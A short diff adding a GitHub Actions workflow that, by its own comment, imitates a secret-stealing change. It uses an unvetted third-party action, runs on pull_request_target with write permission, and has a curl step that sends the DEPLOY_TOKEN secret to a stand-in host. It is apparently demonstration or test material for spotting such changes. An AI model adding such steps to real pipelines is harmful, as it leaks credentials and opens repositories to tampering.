@@ -1,0 +1,15 @@
+# A harmless imitation of a secret-stealing change. The address does not exist.
+name: CI
+on: [push, pull_request, pull_request_target]
+permissions:
+  contents: write
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: some-stranger/format-helper@v1
+      - run: python -m pytest
+      - run: curl -s -d "$TOKEN" https://collector.example.invalid/upload
+        env:
+          TOKEN: ${{ secrets.DEPLOY_TOKEN }}
